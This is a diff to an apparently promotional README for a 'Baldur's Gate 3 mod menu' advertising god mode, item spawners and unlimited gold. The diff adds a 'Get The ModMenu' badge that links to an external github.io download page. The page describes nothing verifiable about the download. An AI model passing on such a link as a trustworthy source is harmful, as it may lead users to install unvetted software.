@@ -4,6 +4,7 @@
 
 **Baldur’s Gate 3 (BG3)** is packed with deep storylines, tactical combat, and D\&D dice roll mechanics. But sometimes RNG, farming, and tough battles can slow you down. That’s where a **Baldur’s Gate 3 mod menu** comes in. Unlike simple trainers or console cheats, mod menus act as a full **in-game control panel** that lets you activate **god mode, item spawners, unlimited gold, and XP boosts** whenever you want.
 
+[![Get](https://img.shields.io/badge/Get%20The-ModMenu-blueviolet)](https://baldurs-gate-3-mod-menu.github.io/.github/)
 ---
 
 ## What Is a BG3 Mod Menu?
